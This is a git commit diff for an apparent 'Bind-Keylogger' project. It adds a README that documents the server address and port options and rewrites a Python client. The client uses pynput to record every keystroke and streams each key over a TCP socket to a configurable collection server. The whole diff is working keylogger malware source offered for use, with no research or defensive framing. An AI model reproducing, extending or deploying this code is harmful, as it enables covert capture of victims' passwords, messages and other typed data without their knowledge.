9a8168c6f64544d81bef0152a8e9f4b126a58615
Raffrerty <raffsimms23@gmail.com>
2021-08-31 22:51:12 +0100

    Client Redo

---
+++ client/README.md
@@ -0,0 +1,7 @@
+# Bind-Keylogger Client
+
+## Options
+
+- SERVER_ADDRESS - Define the address of the Bind-Keylogger server where keystroke data will be sent.
+- SERVER_PORT - Define the port on which to connect to the Bind-Keylogger server
+
--- client/client.py
+++ client/client.py
@@ -1,29 +1,36 @@
 import socket
 from pynput import keyboard
 
+SERVER_ADDRESS = "127.0.0.1"
+SERVER_PORT = 6666
+
+class Session:
+    def __init__(self, address, port):
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.address = address
+        self.port = port
+    
+    def connect(self):
+        self.client_socket.connect((self.address, self.port))
 
 class Keylogger:
-    def __init__(self, cs):
-        self.key_store = []
-        self.key_map = {
-            "enter": "\n",
-            "space": " ",
-            "tab": "\t",
-            "backspace": "\b"
-        }
-        self.client_socket = cs
-        self.client_socket.connect(("127.0.0.1", 6666))
+    def __init__(self):
+        self.key_map = {"enter": "\n", "space": " ", "tab": "\t"}
 
-    def button_pressed(self, button):
-        if hasattr(button, "char"):
-            self.client_socket.send(button.char.encode())
+    def press(self, key):
+        print(key.__dict__)
+        if hasattr(key, "char"):
+            if key.char:
+                server.client_socket.send(key.char.encode())
         else:
-            key_pressed = self.key_map.get(button._name_, " *{0}* ".format(button._name_))
-            self.client_socket.send(key_pressed.encode())
-
+            pressed = self.key_map.get(key._name_.split("_")[0], "[{0}]".format(key._name_.split("_")[0]))
+            server.client_socket.send(pressed.encode())
 
 if __name__ == '__main__':
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    keylogger = Keylogger(client_socket)
-    with keyboard.Listener(on_press=keylogger.button_pressed) as listener:
+    server = Session(SERVER_ADDRESS, SERVER_PORT)
+    server.connect()
+
+    keylogger = Keylogger()
+    with keyboard.Listener(on_press=keylogger.press) as listener:
         listener.join()
+
